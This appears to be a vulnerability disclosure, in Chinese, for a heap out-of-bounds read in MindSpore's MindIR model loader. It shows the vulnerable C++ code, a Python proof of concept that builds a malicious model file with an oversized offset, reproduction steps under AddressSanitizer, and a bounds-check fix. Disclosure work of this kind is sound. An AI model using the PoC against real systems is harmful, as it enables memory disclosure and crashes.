# MS-2025-002: MindIR External Data Offset 堆越界读取

## 基本信息

| 字段 | 值 |
|------|-----|
| **项目** | [mindspore-ai/mindspore](https://github.com/mindspore-ai/mindspore) |
| **版本** | 2.4.0rc1 (main branch 截至 2026-05-19) |
| **严重性** | High |
| **CVSS 3.1** | 7.1 (AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:H) |
| **CWE** | CWE-125 (Out-of-bounds Read) |
| **发现日期** | 2026-05-19 |
| **攻击向量** | 本地/需要用户加载恶意模型文件 |
| **影响组件** | `mindspore/core/load_mindir/load_model.cc` |

## 漏洞概述

MindSpore 在加载 MindIR 模型时，从外部文件读取张量数据后，使用 protobuf 中的 `external_data.offset` 字段作为源缓冲区的偏移量进行内存拷贝。该 `offset` 值**完全由模型文件控制，且没有边界校验**。

当 `offset >= file_size` 时，`data + offset` 指向已分配堆缓冲区之外的内存，导致堆越界读取（Heap Buffer Over-Read）。

## 影响

- **信息泄露**：读取堆上的相邻数据（可能包含其他模型参数、密钥、用户数据）
- **崩溃/DoS**：如果越界读取触及未映射页面，导致 segfault
- **ASLR 绕过**：在某些条件下可用于泄露堆布局信息

## 漏洞代码

**文件**: `mindspore/core/load_mindir/load_model.cc` (第984-994行)

```cpp
  // data 指向从文件读取的缓冲区，大小为 file_size
  auto *tensor_data_buf = reinterpret_cast<uint8_t *>(tensor_info->data_c());
  MS_EXCEPTION_IF_NULL(tensor_data_buf);
  MS_EXCEPTION_IF_NULL(data);

  if (tensor_info->data().nbytes() == 0 || tensor_proto.external_data().length() == 0) {
    return true;
  }

  // ⚠️ offset 来自 protobuf，无边界检查！
  // 如果 offset >= file_size，则 data + offset 越过堆缓冲区边界
  auto ret =
    common::huge_memcpy(tensor_data_buf, tensor_info->data().nbytes(), 
                        data + tensor_proto.external_data().offset(),  // ← OOB!
                        LongToSize(tensor_proto.external_data().length()));
```

**上下文**：`data` 是通过 `new char[file_size]` 分配的堆缓冲区（第963行），大小为文件实际大小。但 `tensor_proto.external_data().offset()` 可以是任意 int64 值。

**缺失的校验**：
```cpp
// 应该有但没有的检查：
if (tensor_proto.external_data().offset() + tensor_proto.external_data().length() > file_size) {
    MS_LOG(ERROR) << "External data offset/length exceeds file size.";
    return false;
}
```

## PoC 构造思路

```python
"""
构造恶意 MindIR 触发堆越界读取
设置 offset = 0x100000 (远超正常文件大小)
"""
from mindspore.train.mind_ir_pb2 import ModelProto

model = ModelProto()
model.ir_version = 6
model.producer_name = "MindSpore"
graph = model.graph
graph.name = "oob_graph"

param = graph.parameter.add()
param.name = "Default/param0:param0"
param.data_type = 1  # FLOAT32
param.dims.extend([256])

# 创建一个小的合法外部数据文件
import os
os.makedirs("./oob_model", exist_ok=True)
with open("./oob_model/data.bin", "wb") as f:
    f.write(b"\x01\x00\x00\x00" * 16)  # 64 bytes 的合法数据

# 设置 external_data，offset 远超文件大小
param.external_data.location = "data.bin"
param.external_data.offset = 0x100000   # ← 远超 64 bytes 的文件大小！
param.external_data.length = 1024       # 读取 1024 bytes 的堆越界数据

with open("./oob_model/oob_model.mindir", "wb") as f:
    f.write(model.SerializeToString())

print("PoC 模型已创建。加载时将触发堆越界读取:")
print("  import mindspore")
print("  mindspore.load('./oob_model/oob_model.mindir')")
```

## 本地复现步骤

```bash
# Step 1: 安装 MindSpore
pip install mindspore==2.4.0rc1

# Step 2: 创建 PoC
python3 poc_oob_read.py

# Step 3: 用 AddressSanitizer 验证
# 如果从源码编译，添加 -fsanitize=address
export ASAN_OPTIONS=detect_leaks=0
python3 -c "import mindspore; mindspore.load('./oob_model/oob_model.mindir')"

# ASAN 应报告类似：
# ==12345==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x...
# READ of size 1024 at 0x... thread T0
#     #0 memcpy_s ...
#     #1 mindspore::MSANFModelParser::GetTensorDataFromExternal(...)
```

## 修复建议

```cpp
// 在 huge_memcpy 之前添加边界校验
size_t offset = LongToSize(tensor_proto.external_data().offset());
size_t length = LongToSize(tensor_proto.external_data().length());

// 检查 offset + length 是否溢出或超出文件大小
if (offset > file_size || length > file_size - offset) {
  MS_LOG(ERROR) << "External data offset(" << offset << ") + length(" << length 
                << ") exceeds file size(" << file_size << ").";
  return false;
}

auto ret = common::huge_memcpy(tensor_data_buf, tensor_info->data().nbytes(), 
                               data + offset, length);
```

## 参考

- [CWE-125: Out-of-bounds Read](https://cwe.mitre.org/data/definitions/125.html)
- [CVE-2023-25801: TensorFlow OOB read in TFLite](https://nvd.nist.gov/vuln/detail/CVE-2023-25801)
